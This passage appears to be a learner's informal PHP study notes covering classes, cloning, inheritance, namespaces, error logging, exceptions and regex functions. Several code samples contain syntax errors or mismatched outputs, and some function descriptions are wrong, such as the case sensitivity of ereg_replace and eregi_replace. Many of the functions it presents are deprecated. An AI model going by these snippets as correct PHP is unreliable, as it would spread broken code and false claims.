		{
			echo "<p>Book class instance destroyed.</p>";
		}
	}

	$book = new Book("0615303889");
?>

When a script finishes, normally data that is stored in memory, gets destroyed automatically. The issue is, however, if you have
data that is related to a DB that is supposed to be destoyed. Which does not automatically occur, that, we must define
our custom destructor() for, due to the fact that the object is not in Data and assumed that it needs to be destroyed upon finish.

In PHP, we have static members, as per usual, just that we CAN NOT, call them with $this, instead we must refer to them with self::<Var name>
What follows, is an example of a class that uses static members:

<?php
	class Visitor
	{
		private static $visitors = 0;

		function __construct()
		{
			self::$visitors++;
		}

		static function getVisitors()
		{
			return self::$visitors;
		}
	}

	//Instatiate the visitor class
	$visits = new Visitor();

	echo Visitor::getVisitors()."<br />";

	//Instansiate another visitor class
	$visits2 = new Visitor();

	echo Visitor::getVisitors()."<br />";
?>

The results are as follows:

1 //because instansiation of first time
2 //due to second time

In PHP, we have the instanceof keyword, as per Java.

In PHP, we have a set of Helper Functions, which are as follows:

boolean class_alias(string <original classname>, string <aliasname>); //Allows a class to be refered to by more than just it's original name

boolean class_exists(string <class_name>); //Returns TRUE if the specified class exists in the executing script, false otherwise

string get_class(object <object>); //gets the class for the relevant object, returns False if it is not a Class object

array get_class_methods(mixed <classname>); //returns an array with methods in the specified classname, if it exists

array get_class_vars(string <classname>); //Returns an associative array of all properties and coresponding values within the class named classname

array get_declared_classes(); //Returns an array of all declared classes in the executing script. Results vary based on situation.

array get_object_vars(object <object>); //returns an array with object variables for the defined object, NULL if none exists

string get_parent_class(mixed <object>); //Returns a string with the parent class if one exists, returns classname otherwise

boolean interface_exists(string <interface_name> [, boolean <autoload>]); //Returns true if the specified interface exists, false otherwise

boolean is_a(object <object>, string <classname>); //Returne true of object has any relation to classname, false otherwise

boolean is_subclass_of(mixed <object>, string <classname>); //object can be passed in as obj or string, returns true if is subclass of classname, False otherwise

boolean method_exists(object <object>, string <method_name>); //returns true if the method is available to the specified object

In terms of requiring other classes and methods, PHP allows for autoloading, in a special autoload method, as follows:

function __autoload($class) {
	require_once("classes/$class.class.php"); 
}

The above method is called upon when a class that has not been loaded in yet is refered to, thus elimiting the need of require_once() and akin.
__autoload can be put in a seperate Global PHP environment file that creates so that only this one needs to be loaded.

In PHP, the following concepts of advanced OOP is supported:

Object cloning

Inheritance

Interfaces

Abstract Classes

Namespaces

Multiple Interfaces

What is NOT supported, in PHP, as of 5.5ish (might be different in 7), is as follows:

Method overloading

Operator overloading

Multiple inheritance

To clone an object in PHP, you have to use the explicit syntax of clone, as follows:

destinationObject = clone targetObject;

What follows, is an example of cloning an object:

<?php
	class Corporate_Drone {
		private $employeeid;
		private $tiecolor;

		//Define a setter and getter for $employeeid
		function setEmployeeID($employeeid) {
			$this->employeeid = $employeeid;
		}

		function getEmployeeId() {
			return this->employeeid;
		}

		//Define a setter and getter for $tiecolor
		function setTieColor($tiecolor) {
			$this->tiecolor = $tiecolor;
		}

		function getTieColor() {
			return $this->tiecolor;
		}
	}

	//create a new Corporate_Drone object
	$drone1 = new Corporate_Drone();

	//Set the $drone1 employeeid property
	$drone1->setEmployeeID("12345");

	//Set the $drone1 tieColor prop
	$drone1->setTieColor("Red");

	//Clone the drone1 object
	$drone2 = clone $drone1;

	//Set the $drone2 employeeid prop
	$drone2->setEmployeeID("6789");

	// Output the $drone1 and $drone2 employeeid props

	printf("Drone1 employeeID: %d <br />", $drone1->getEmployeeID());
	printf("Drone1 tie color: %s <br />", $drone1->getTieColor());

	printf("Drone2 employeeID: %d <br />", $drone2->getEmployeeID());
	printf("Drone2 tie color: %s <br />", $drone2->getTieColor());
?>

Will give the output as follows:

Drone1 employeeID: 12345
Drone1 tieColor: red
Drone2 employeeID: 67890
Drone2 tie color: red

As can be seen, the cloning was successful

If we wish to further tweak the clone method, we could modify it's syntax to be preceeded by __, as is shown in the following example:

function __clone() {
	$this->tiecolor = "blue"; //Put this in the corporate_drone object
}

//Create a new Corporate_Drone object
$drone1 = new Corporate_Drone();

//Set the $drone1 employeeid property
$drone1->setEmployeeID("12345");

//Clone the $drone1 object
$drone2 = clone $drone1;

//Set the $drone2 employeeID prop
$drone2->setEmployeeID("67890");

//Output the $drone1 and $drone2 employeeid properties
printf("Drone1 employeeID: %d <br />", $drone1->getEmployeeID());
printf("Drone2 employeeID: %d <br />", $drone2->getEmployeeID());
printf("Drone2 tie color: %s <br />", $drone2->getTieColor());

Gives the output as follows:

Drone1 employeeID: 12345
Drone2 employeeID: 67890
Drone2 tie color: blue

What follows, is an example of inheritance in PHP:

<?php
	//Define a base Employee class
	class Employee {
		private $name;

		//Define a setter for the private $name property
		function setName($name){
			if($name == "") echo "Name cannot be blank!";
			else $this->name = $name;
		}

		//define a getter for the private $name property
		function getName(){
			return "My name is ".$this->name"<br />";
		}
	}	//End of EMployee class

	//Define a executive class that inherits
	class Executive extends Employee {
		//Define a method unique to employee
		function pillageCompany(){
			echo "I'm selling company assets lol this guy is salty";
		}
	} //End of executive class

	//Create a new exec object
	$exec = new Executive();

	// Call the setName() method, defined in the employee class
	$exec->setName("Richard");

	//Call the getName() method
	echo $exec->getName();

	//Call the pillageCompany() method
	$exec->pillageCompany();
?>

This would give the output of:

My name is Richard
I'm selling company assets lol this guy is salty

An example of inheritance of a inherited class:

<?php
	
	class Employee {
	...
	}

	class Executive extends Employee {
	...
	}

	class CEO extends Executive {
		function getFaceLift() {
			echo "Nip nip nip some random shit";
		}
	}

	$ceo = new CEO();
	$eco->setName("Bernie");
	$eco->pillageCompany();
	$eco->getFaceLift();
?>

We can refer to other constructors by virtue of <classname>::__construct() or parent::__construct()

NOTE: When we inherit a class, if the child class has it's own construct, it uses that first, if not, it uses the parents.

In PHP, if we were to refer to a static variable, in terms of inherited variables, we would have to do so in a specific syntax, as follows:

<?php
	
class Employee{
	
	public static $favSport = "Football";

	public static function watchTV()
	{
		//echo "Watching ".self::$favSport; //This would be the wrong referal in terms of static handling in terms of functions
		//instead, we must do as follows:

		echo "Watching ".static::$favSport;
	}
}

class Executive extends Employee {
	public static $favSport = "Polo";
}

echo Executive::watchTV();

?>

What follows, is an example of how PHP 5 integrates interfaces:

interface IinterfaceName
{
	CONST 1;
	...
	CONST N;
	function methodName1();
	...
	function methodNameN();
}

Implementing interfaces in PHP is the same as in Java.

The general syntax is as follows:

class Class_Name implements interfaceName
{
	function methodName1()
	{
		//methodname1 implementation
	}

	function methodNameN()
	{
		//methodNameN() implementation
	}
}

Implementing several interfaces are as per usual, with the genral syntax:

class ClassName implements interface1, interface2
{
	//methods
}

Abstract classes are the same as per Java.

The general gist of implementation of interface versus abstract, is as follows:

If cluster of close-related classes : Abstract, otherwise, Interface

If multiple sources of inheritance : interfaces. Multiple inheritance of Abstract classes is not allowed.

If a common shared behaviour is to be set : use an abstract class. Behaviour is not supported in interfaces.

In PHP, we have something called namespaces, that allows us to integrate classes with the same names, in different scripts, into one script,
provided that we declared each specific class with a namespace, to begin with, as will be showcased in the following example:

v-- Is in DataCleaner.inc.php
class Clean {
	
	function filterTitle($text){
		//capitalize the first word and trim the text of whitespace, then return it
		return ucfirst(trim($text));
	}
}


v-- Is in Library.inc.php
class Clean{
	
	function removeProfanity($text){
		$badwords = array("idiotic" => "shortsighted", "moronic" => "unreasonable", "insane" => "illogical");

		//Remove the bad words
		return strtr($text, $badwords);
	}
}

When we attempt to require both, we get an error, due to not having implemented the namespaces yet:

require "DataCleaner.inc.php";
require "Library.inc.php";

To resolve it, we simply append namespaces to the top of each script, as follows:

namespace Com\Wjgilmore\Library;
namespace Com\Thirdparty\DataCleaner;

To reflect how this is then used in the script later on, what follows, is the example that utilizes these namespaces:

<?php
	require "Library.inc.php";
	require "Data.inc.php";

	use Com\Wjgilmore\Library as WJG;
	use Com\Thirdparty\DataCleaner as TP;

	//Instansiate the library's clean class
	$filter = new WJG\Clean();

	//instansiate the datafilter's Clean class
	$profanity = new TP\Clean();

	//Create a book title
	$title = "the idiotic sun also rises";

	//Output the title before filtering occurs
	printf("Title before filters: %s <br />", $title);

	//Remove profanity from the title
	$title = $profanity->removeProfanity($title);

	printf("Title after WJG\Clean: %s <br />", $title);

	//Remove whitespace and capitalize the title
	$title = $filter->filterTitle($title);

	printf("Title after TP\Clean: %s <br />", $title);

?>

The output we get, is as follows:

Title before filters: the idiotic sun also rises
Title after TP/Clean: the shortsighted sun also rises
Title after WJG\Clean: The Shortsighted Sun Also Rises

In PHP, there are three levels of error-handling, as follows:

Configuration Directives

Error logging 

Exception handling

What follows, is a list of error directives, where the beginning is the highest directive, and each following one, fills the rest of the spots:

E_ALL : All errors and warnings

E_COMPILE_ERROR : Fatal compile-time errors

E_COMPILE_WARNING : Compile-time warnings

E_CORE_ERROR : Fatal errors that occur during PHP's initial start

E_CORE_WARNING : Warnings that occurs at PHP's initial start

E_DEPRECATED : Warnings regarding use of features schedueled for removal in a future PHP release

E_ERROR : Fatal run-time errors

E_NOTICE : Run-time notices

E_PARSE : Compile-time parse errors

E_RECOVERABLE_ERROR : Near-fatal errors 

E_STRICT : PHP version portability suggestions, activates on deprecated things, incorrect references, usage of Var rather than scope level

E_USER_DEPRECATED : Warnings regarding deprecated functions, stemming for user initated use

E_USER_ERROR : User-generated Errors

E_USER_NOTICE : User-generated notices

E_USER_WARNING : User-generated warnings

E_WARNING : Run-time warnings

NOTE: Error directives uses ~ to notify NOT.

In development stages, we should set directives as follows: //Note: This will activate ALL errors to be reported

error_report = E_ALL & E_STRICT //in pre php 6, E_ALL does not include E_STRICT 

We can also interact with logical operators in terms of configuring error_reports, as follows:

error_reporting = E_ERROR | E_PARSE | E_CORE_ERROR

And if we wish to omit just one, for instance, we could do as follows:

error_reporting = E_ALL & ~E_USER_WARNING //All except user warnings


If we wish to find out the latest errors done by the server, we can find this with the error_get_last() method.

NOTE: Errors will display due to the variable display_errors is set to TRUE, this should only be so during testing phases.
When the website is live, display_errors should be set to FALSE.

The reason error notification should be off for live websites, is that it can reveal crucial info and confuse users.

Further more, there is a variable for startup errors, called display_startup_errors, which displays errors during the startup of the PHP
engine. Just as per display_errors, it should only be on if the website is in construction, not live.

When it comes to logging errors, we have the variable of log_errors for that. Exactly where they go, depends on what we have defined
the error_log as.

Errors can be sent to the logging daemon or can be sent to a file specified by the admin in the error_log directive.
If this directive is set to be the logging daemon, it will be sent to syslog on Linux or the event log on windows.

syslog (LINUX) and event log (WINDOWS), are basically APIs that record error logs and are useful for viewing errors. They can be 
accessed with the Event Viewer.

The default max size of the error log, is 1,024 bytes. If it's set to 0, it means it has no size limit.

The ignore_repeated_errors causes PHP to disregard repeated errors in the same script and same line.

if we enable ignore_repeated_source , it causes PHP to ignore repeated error messages from different files or different lines within
the same file.

Enabling track_errors causes PHP to store the most recent error message in the variable $php_errormsg.

NOTE: If we choose to save the error logs to a specific file, the webserver admin user must have permissions for said file, at least writing.
And we should not put it in the root dir.

If we were to write to the syslog, we'd get the following output:

Dec 5 10:56:37 example.com httpd: PHP Warning: fopen(/home/www/htdocs/subscribers.txt): failed to open stream: Permission denied in 
/home/www/htdocs/book/8/displayerrors.php on line 3

When we write it to a seperate text file:

[05-Dec-2005 10:53:47] PHP Warning: 
fopen(/home/www/htdocs/subscribers.txt): failed to open stream: Permission denied in /home/www/htdocs/book/8/displayerrors.php on line 3

If we run a shared webserver, we are likely forced to send the logs to a textfile or a data table

if we own the server, we could send it to the syslog, which allows us to use parsing-utilities.

Furthermore, PHP allows us to send custom message outputs as well as general error output to the system syslog.
There are 4 main functions, that handle this.

In case of PHP 5.2.X or older, then we must first give the define_syslog_variables() function to initialize the constants
nessecary for using the openlog(), closelog() and syslog(). It follows the general syntax:

void define_syslog_variables(void)

In 5.3 and high, it's deprecated or removed.

To open a connection to the logger which allows us to set the stage for insertion of one or more messages. The general syntax for this,
is as follows:

int openlog(string <ident>, int <option>, int <facility>)

ident: Identifies messages. Added to the beginning of the entry, usually named after the file name, so PHP or PHP5 or PHP6

option: Determines which logging options are used when generating the message. If we specify more than one, we seperate them with a |

facility: Helps to determine what category of program is logging the message. There are a number of categories:

LOG_KERN, LOG_USER, LOG_MAIL, LOG_DAEMON, LOG_AUTH, LOG_LPR and LOG_LOCAL<N> (Where N is between 0 and 7)

The designated facility determines the message destination. For example, giving the LOG_CRON designation,
results in the submission of subsequent messages to the cron log, whereas designating LOG_USER will make it
direct to the messages file.

Unless we are using PHP as a commandline-interpeter, we usually will have it set to LOG_USER.

If we are running PHP scripts from a crontab, we usually run with the LOG_CRON.

What follows, is the list of options, that we can feed to the openlog method:

LOG_CONS : If an error occurs when writing to the syslog, send output to the system console.

LOG_NDELAY : Immediately open the connection to the syslog.

LOG_ODELAY : Do not open the connection until the first message has been submitted for logging. This is the default.

LOG_PERROR : output the logged message to both the syslog and standard error.

LOG_PID : Accompany each message with the process ID (PID).

calling openlog() is optional, nessecary only if we wish to prefix our log message with a predefined string,
otherwise we can use the syslog() function directly.

further more, if we wish to close the connection to the log, we can do as follows, simply:

int closelog()

If we wish to send a custom message to the syslog, we can use the syslog() method, which looks as follows:

int syslog(int <prio>, string <message>)

The first param, of which has priorities in terms of log prioritiy levels, follows:

LOG_EMERG : A serious system problem, likely signaling a crash

LOG_ALERT : A condition that must be immedeatly resolved to avert jepordizing system integrity

LOG_CRIT : A critical error that could render a service unusable, but not nessecarily harming the system

LOG_ERR : A general error

LOG_WARNING : A general warning

LOG_NOTICE : A normal, but notable condition

LOG_INFO : A general info message

LOG_DEBUG : Info that is typically only relevant when debugging an app.

The second param, is the String that we put into the error logging. If we'd like to log a error message specifically,
we can put in %m in the message.

What follows, is an example of how to make a logerror:

<?php
	define_syslog_variables(); //dperecated
	openlog("CHP8", LOG_PID, LOG_USER); //open a connection
	syslog(LOG_WARNING, "Chapter 8 example warning"); //send a message through the connection with a error level of generic
	closelog(); //close the connection
?>

Will produce, in the syslog:

Dec 5 20:09:29 CHP8[30326]: Chapter 8 example warning.

In terms of exception handling in PHP, we have the base PHP Exception Class, which has two constructors.
One of which has no arguments, and the second overloaded one, has 2 optional args. In total, the class has 7 methods.

The base syntax of throwing an error in PHP is as per Java, as we will see:

throw new Exception();

Note: only 4 of the methods are relevant for the non-overloaded version.

The overloaded version of the Exception class, is as follows:

throw new Exception(string <message>, int <error_code>, Exception previous);

The three optional parameters, are explained as follows:

message : Intended to be the message followed by the error. Can be acessed through getMessage().

error_code : Holds a error code that can be mapped to some identifier-to-message table. Often they are used for reasons of internalization
and localization. To get this error code, we can use the getCode() method. The base exception class can be extended to compute identifier-to-message
table lookups.

previous : passes in the current exception to be thrown. Can be used to create a stack of exceptions, which can be used for debugging complex problems.

In total, there are 7 methods available to the exception class, as follows:

getCode() : Returns the error code if it is passed to the constructor

getFile() : Returns the name of the file throwing the exception

getLine() : Returns the line number for which the exception is thrown

getMessage() : Returns the message if it is passed to the constructor

getPrevious() : returns the previous exception, assuming it was called through the exception constructor

getTrace() : Returns an array of information pertinent to the context in which the error code occurred.
			 Specifically, this array includes the file name, line, function and function parameters.

getTraceAsString() : Returns all of the same information as it is made available by getTrace(), except that
this info is returned as a string rather than as an array.

NOTE: All of the above methods are declared as final, YOU CANNOT OVERRIDE THEM.

What follows, is an example of how to have a try and catch, with error processing:

try {
	
	$fh = fopen("contacts.txt", "r"); //Attempt to read the file
	if (! $fh) { //if it is not actually a file that could be opened
		throw new Exception("Could not open the file!");
	}
}
catch (Exception $e){
	echo "Error (File: ".$e->getFile().", line ".$e-getLine()."): ".$e->getMessage();
}

This will give the output of:

Error (File: /usr/local/apache2/htdocs/8/read.php, line 6): Could not open the file!

if we wish, we can extend the exception base class, to create more customized self-made exceptions,
which allows us to do cool things with it. For example, what follows, is a class that extends Exception and 
allows for feeding of customized languages, for instance:

class MyException extends Exception {
	
	function __construct($language, $errorcode){ //constructor that assigns language and errorcode
		$this->language = $language;
		$this->errorcode = $errorcode;
	}

	function getMessageMap() { //Function
		$errors = file("errors/".$this->language.".txt"); //define errors to be the file errors/<language>.txt
		foreach($errors as $error){ //iterate through the errors
			list($key, $value) = explode(",", $error,2); //explode the error and store the values
			$errorArray[$key] = $value; //add to a array called errorArray where the key has it's associated value
		}
		return $errorArray[$this->errorCode]; //return the message from the errorArray that has the co-responding errorCode
	}
}

try{
	throw new MyException("english", 4); //Throw the exception
}
catch(MyException $e){
	echo $e->getMessageMap(); //Echo out the results of calling the function on the exception object
}

What follows, is a showcasing example of how to catch several exceptions:

<?php
	
	/* The InvalidEmailException class notifies the site
	   admin if that an an e-mail is deemed as invalid. */

	class InvalidEmailException extends Exception {

		function __construct($message, $email) {
			$this->message = $message;
			$this->notifyAdmin($email);
		}

		private function notifyAdmin($email) {
			mail("admin@example.org", "INVALID EMAIL", $email, "From:web@example.com");
		}
	}

	/* The Subscribe class validates an e-mail address
		and adds the e-mail adress to the database. */

	class Subscribe {
		function validateEmail($email) {
			try {
				if ($email == "") {
					throw new Exception("You must enter an e-mail address!"); //No empty entries
				} else{
					list($user,$domain) = explode("@", $email); //Split the email into two parts

					if (! checkdnsrr($domain, "MX")) //check the dns to confirm that the e-mail is a valid one
						throw new InvalidEmailException("Invalid e-mail adress!", $email);

					else
						return 1;
				}
			} catch (Exception $e) {
				echo $e->getMessage();
			} catch (InvalidEmailException $e) {
				echo $e->getMessage();
				$e->notifyAdmin($email);
			}
		
		}

		/* Add the e-mail address to the database */

		function subscribeUser() { //function for giving success message
			echo $this->email." added to the database!";
		}
	}

	//Assume that the e-mail came from a subscription form

	$_POST['email'] = "someuser@example.com"; //Access the $_POST superglobal and attach the email to be assign value

	/* Attempt to validate and add address to the database. */
	if (isset($_POST['email'])) { //Checks to see if the variable is set and not null
		$subscribe = new Subscribe(); //Create a subscribe object
		if($subscribe->validateEmail($_POST['email'])) //if the email given is a valid email checked with dns
			$subscribe->subscribeUser($_POST['email']); //then subscribe the user with the email
	}
?>

The standard library of PHP, (SPL), extends PHP and includes methods that simplify business for us (such as opening files, stacks, queues, etc.) some 
of which are not inheritly supported in PHP by default (such as stacks, queues)

What follows, is a list of all the exceptions, where they are logic or runtime exceptions :

BadFunctionCallException : Should be used to handle scenarios where an undefined method is called or if an incorrect number of arguments
are called in conjunction with a method.

BadMethodCallException : Should be used to handle scenarios where an undefined method is called, or if an incorrect number of args are called with a method.

DomainException : Should be used to handle scenarios where an input value falls outside of a range. For instance, if a weight-loss app involves a method
which is intended to save a user's current weight to a DB, and the value given is less than 0, a Domain error should be called.

InvalidArgumentException : Should be used where an incompatible type of an argument is attempted to be used

LengthException : Should be used when the length of a string does not conform to our needs

LogicException : Should be used when programming errors occur, like calling a method before setting class attributes etc.

OutOfBoundsException : Should be used where a value does not match any of the keys in an array

OutOfRangeException : Should be used to define when output values go out of range

OverflowException : Should be used where an arithmetic or buffer overflow occurs. An example would be adding a value to a pre-defined maxed out size array.

RangeException : Should be used to handle arithmetic errors unrelated to overflow and underflow

RuntimeException : This is one of the two base classes of which all other SLP exceptions extend from, the other being LogicException, use this to handle
					Runtime errors.

UnderflowException : Should be used in underflow situations. ex: Removing a value from a empty array

UnexpectedValueException : Should be used to hinder unexpected types in terms of usage.

Note: The naming of these is what we are after, to make the code more reasonable in terms of what occurs.

In terms of Regex, PHP uses Perl regex.

PHP uses PEAR; which is a standardizes system that contains a set of functions, such as formatting of SSN, zip codes etc.
String manipulation, is also very extended in PHP, where there is a lot of tools supporting it.

in POSIX related Regex, we can use the | to pipe regexes together, as follows:

php|zend //This will run a regex against both php and zend

What follows, is a list of Quantifiers that applies to regexes in terms of POSIX:

+ : Matches against at least one or more occurances

* : Zero or more occurances

? : Zero or one

<letter>{2} : Sequence of 2 of the specified letter

<letter>{2,3} : Sequence of 2 to 3, of the specified letter

<letter>{2,} : Sequence of at least 2, of the specified letter

<letter>$ : End of string contains specified letter

^<letter> : Any string with the specified letter at the beginning

[^a-zA-Z] : Any string not containing the letter in range of a-zA-Z

<letter>.<letter> : Any string having the pattern where . is any char

Examples of some combinations of a regex:

^.{2}$ : Matches against a string of exactly 2 chars

<b>(.*)</b> : Matches any string encased in the <b></b> notations

p(hp)* : matches any string containing a p followed by zero or more instances of hp

What follows, is an example of a regex that checks against a Dollarsign followed by at least 1 integer:

([\$])([0-9]+); //Escape the dollarsign with \ to make it literal, range of 0-9 and have at least 1 occurance of it

In the POSIX regex, there is a set of pre-defined characters that allows a automatic check against a range, as follows:

[:alpha:] : same as [A-Za-z]

[:alnum:] : same as [A-Za-z0-9]

[:cntrl:] : Control chars such as tab, escape, space

[:digit:] : same as [0-9]

[:graph:] : printable chars found in ascii range of 33 to 126

[:lower:] : lowercase alphabetical chars

[:punct:] : Punctuation chars, such as ~ ` ! @ # $ % ^ & * ( ) - _ + = { } [ ] : ; ' < > , . ? and /

[:upper:] : same as [A-Z]

[:space:] : Whitespace chars, such as horizontal tabs, space, vertical tabs, new line, form feeds, or carriage returns

[:xdigit:] : Hexadecimal chars, same as [a-fA-F0-9]

In the POSIX Regex, PHP allows a number of methods, as follows:

The pattern that will follow, is the name first and a short desc, followed by official syntax.

ereg() : Executes a case-sensitive search of a string for a defined pattern, returning the length of the matched string if found, FALSE otherwise

int ereg(string <pattern>, string <string> [, array <regs>]). An example of using the ereg:

<?php
	$username = "jasoN";
	if (ereg("([^a-z]", $username)) //evalutes true because jasoN is not all lowercase
		echo "Username must be all lowercase!";
	else
		echo "Username is all lowercase!";
?>

The alternative part of the ereg method, the <regs> part, contains an array with all the matched expressions, as is showcased:

<?php
	$url = "http://www.apress.com";

	//Break the $url down into three distinct pieces:
	// "http://www", "apress", and "com"
	$parts = ereg("^(http://www")\.([[:alnum:]]+)\.([[:alnum:]]+)", $url, $regs);

	echo $regs[0]; //outputs the entire thing, "http://www.apress.com"
	echo "<br />";
	echo $regs[1]; // outputs "http://www"
	echo "<br />";
	echo $regs[2]; // outputs "apress"
	echo "<br />";
	echo $regs[3]; // outputs "com"
?>

Ouputs:

http://www.apress.com
http://www
apress
com

------------------------------------------------------------------------------------------------------ //new section

eregi() : Case insensitive search

int eregi(string <pattern>, string <string>[, array <regs>])

What follows, is an example that checks against a passwd, for instance:

<?php
	$pswd = "jasonasdf";
	if (!eregi("^[a-zA-Z0-9]{8,10}$", $pswd))
		echo "Invalid Password!";
	else
		echo "Valid Password";
?>

------------------------------------------------------------------------------------------------------

ereg_replace() : Case-insensitive replacement

string ereg_replace(string <pattern>, string <replacement>, string <string>)

An example:

<?php
	$text = "This is a link to http://www.wjgilmore.com/.";
	echo ereg_replace("http://([a-zA-Z0-9./-]+)$", "<a href=\"\\0\">\\0</a>", $text);
?>

	This would give the following:

	This is a link to 
	<a href="http://www.wjgilmore.com/">http://www.wjgilmore.com/.</a>.

the \n is a backwards match against earlier entries, \0 is the entire string \1 is the first, etc.
9 is the max for this.

An example follows, of how to replace all references to a URL with a working hyperlink:

$url = "Apress (http://www.apress.com)";
$url = ereg_replace("http://([a-zA-Z0-9./-]+)([a-zA-Z/]+)", "<a href=\"\\0\">\\0</a>", $url);

echo $url;
//Displays Apress (<a href="http://apress.com">http://www.apress.com</a>)

NOTE: ereg_replace() is alright, but str_replace() is much faster when there is not a need for more complicated regexes

------------------------------------------------------------------------------------------------------

eregi_replace() : same as ereg_replace(), except it's case-sensitive

string eregi_replace(string <pattern>, string <replacement>, string <string>)

------------------------------------------------------------------------------------------------------

split() : splits a string and returns an array of the split elements

array split(string <pattern>, string <string> [, int <limit>]) //limit is for how many elements we should limit the split to

An example of using split:

<?php
	$text = "this is\tsome text that\nwe might like to parse.";
	print_r(split("[\n\t", $text));
?>

Gives the output:

Array ( [0] => this is [1] => some text that [2] => we might like to parse. )

------------------------------------------------------------------------------------------------------

spliti() : splits a string and returned an array of the split elements, case-insensitive

array spliti(string <pattern>, string <string> [, int <limit>])

------------------------------------------------------------------------------------------------------

sql_regcase() : Splits each character into a delimeter of a uppercase letter and a lowercase letter, as will be shown:

<?php
	$version = "php 6.0";
	echo sql_regcase($version);
	// outputs [Pp] [Hh] [Pp] 6.0
?>

PERL BASED REGEX:
THis is the more current Regex to use, and allows for quantifiers as per usual. The difference is how it is written:

/food/ : Looks for food 

/fo+/ : Looks for fo followed by 1 or more chars

/fo{2,4}/ : matches f followed by 2 to 4 occurances of o

In the Perl regex, we have modifiers, which is as follows:

I : Case insensitive

G : Global search

M : treat a string as several lines. ^ and $ still account for beginning/end, using the M modifier will allow for ^ and $ to match
	at the beginning of any line in a string.

S : Treat a string as a single line, ignoring any \n chars. The opposite of M.

X : Ignore white space and comments within the regex

U : Stops at first match. useful for stopping greedy quantifiers.

modifiers can be combined, just as per linux, and what follows, is a showcasing of running regexes:

/wmd/i : Matches WMD, wMD, WMD, wmd and any other char containing wmd

/taxation/gi : Global case-insensitive search for taxation

The Perl Regex further more uses metacharacters to filter their searches, which is listed as follows:

\A : matches only at the beginning of the String

\b : Matches a word boundry

\B : matches anything but a word boundry

\d : Matches a digit char. This is the same as [0-9]

\D : Matches any nondigit char

\s : Matches a whitespace char

\S : Matches a non whitespace char

[] : Encloses a char class

() : Encloses a char grouping or defines a back reference

$ : Matches the end of a line

^ : Matches the beginning of a line

^ : matches any char except for the newline

\: Quotes the next metachar

\w: Matches against [a-zA-Z0-9_]

\W: basically invert of \w

A few examples:

/sa\b/ : Matches lisa and pisa but not sand, meaning the string must end in sa

/\blinux\b/i : Matches the case-insenstive version of the whole word of linux where it's seperated from everything else

/sa\B/ : The opposite of \b, matches anywhere where it is not a word boundry (i.e, the last letters of the string)

/\$\d+\g : Returns all isntances that matches a dollar sign followed by one or more digits and does it on a global level

In terms of Perl regex syntax, PHP supports 8 methods, as follows:

------------------------------------------------------------------------------------------------------
pref_filter() :

------------------------------------------------------------------------------------------------------


preg_grep() : Searches all elements of an array, returns array of all matches against pattern

array preg_grep(string <pattern>, array <input> [, int <flags>]) //flags is one value, PREG_GREP_INVERT, causes inverted behaviour

An example follows:

<?php
	$foods = array("pasta", "steak", "fish", "potatoes");
	$food = preg_grep("/^p/", $foods);
	print_r($food);
?>

What follows, is the output:

Array ( [0] => pasta [3] => potatoes )

Note: Anything that is not matched, gets a empty spot. To remove it, we can run the array through array_values().


------------------------------------------------------------------------------------------------------
preg_match() : Searches for a pattern, returns TRUE if exists, FALSE otherwise

int preg_match(string <pattern>, string <string>[, array <matches>[, int <flags> [, int <offset>]]])

The optional param matches can contain various sections of the subpatterns contained in the search pattern, if applicable.

An example of preg_match() with case-insensitive mode on:

<?php
	$line = "vim is the greatest word processor ever created! Oh vim, how i love thee!";
	if (preg_match("/\bVim\b/i", $line, $match)) print "Match found!"; //matches against Vim case insensetively
?>

the flag parameter: modifies the matches parameter, changing how the array is populated instead of returning everything

offset : How long into the string the search should occur

------------------------------------------------------------------------------------------------------
preg_match_all() : matches all occurences of a pattern in a string, assigning each occurence to an array
in the order you specify via an optional input param. 

int preg_match_all(string <pattern>, string <string>, array <matches> [, int <flags>] [, int <offset>])

the flags param: Accepts one of the three following args:

PREG_PATTERN_ORDER : The default value. Defines order of results, $pattern_array[0] matches all complete string matches $pattern_array[1] first () set

PREG_SET_ORDER : Defines order of results, $pattern_array[0] becomes first match, $pattern_array[1] becomes second match

PREG_OFFSET_CAPTURE : Populates the array according to putting it in it's relative position found (so if found on 5 word, it gets position 5 in the matching array)

an example:

<?php
	$userinfo = "Name: <b>Zeev Suraski</b> <br> Title: <b>PHP Guru</b>";
	preg_match_all("/<b>(.*)<\/b>/U", $userinfo, $pat_array); //Matches against name encased in HTML bold tags, put them into pat_array
	printf("%s <br /> %s", $pat_array[0][0], $par_array[0][1]); //print out the found values
?>

Gives:

Zeev Suraski

PHP Guru


------------------------------------------------------------------------------------------------------
preg_quote() : inserts a \ before every special char in regex, they are as follows: $ ^ * ( ) + = { } [ ] | \\ : < >

string preg_quote(string <str> [, string <delimeter>])

The optional delimeter defines the delimeter to also be escaped.

an example:

<?php
	$text = "Tickets for the fight are going for $500.";
	echo preg_quote($text);
?>

Returns:

Tickets for the fight are going for \$500\.

------------------------------------------------------------------------------------------------------
preg_replace() : Modifies all occurances with replacement and returns the modified result.

mixed preg_replace(mixed <pattern>, mixed <replacement>, mixed <str> [, int <limit> [, int <count>]])

Both pattern and replacement are noted as mixed, because they can be arrays or strings.

Limit is how many matches should be replaced. Not setting it, or setting it to -1, causes it to replace all occurences.

Count becomes the amount of replacements that occured.

An example of using preg_replace():

<?php
	$text = "This is a link to http://www.wjgilmore.com/.";
	echo preg_replace("/http:\/\/(.*)\//", "<a href=\"\${0}\">\${0}</a>", $text);
?>

This will give:

This is a link to
<a href="http://www.wjgilmore.com/">http://www.wjgilmore.com/</a>.

If we pass arrays as the pattern and replacement params, the function will cycle through each element
of each array. making replacements as they are found. 

An example follows:

<?php
	$draft = "In 2010 the company faced plummeting revenues and scandal.";
	$keywords = array("/faced/", "/plummeting/", "/scandal/");
	$replacements = array("celebrated", "skyrocketing", "expansion");
	echo preg_replace($keywords, $replacements, $draft);
?>

Gives the following:

In 2010 the company celebrated skyrocketing revenues and expansion

There is also the pref_filter() function, which returns the matches, instead of returning the modified result.


------------------------------------------------------------------------------------------------------
preg_replace_callback() : In case of making more advanced custom regexes, we can use this to temporarily tie in a regex with this

mixed preg_replace_callback(mixed <pattern>, callback <callback>, mixed <str> [, int <limit> [, int <count>]])

the callback param is the name of the function you wish to use to import for the regexing

limit : How many matches should occur, -1 or not set, will result in replacing all occurences

count : How many replacements are made.

What follows, is an example of using preg_replace_callback():

<?php
	//This function will add the acronym's long form
	//directly after any acronyms found in $matches
	function acronym($matches) {
		$acronyms = array(
			'WWW' => "World Wide Web",
			'IRS' => "International Revenue Service",
			'PDF' => 'Portable Document Format');

		if (isset($acronyms[$matches[1]]))
			return $matches[1] . " (" . $acronyms[$matches[1]] . ")";
		else
			return $matches[1];
	}

	// The target text
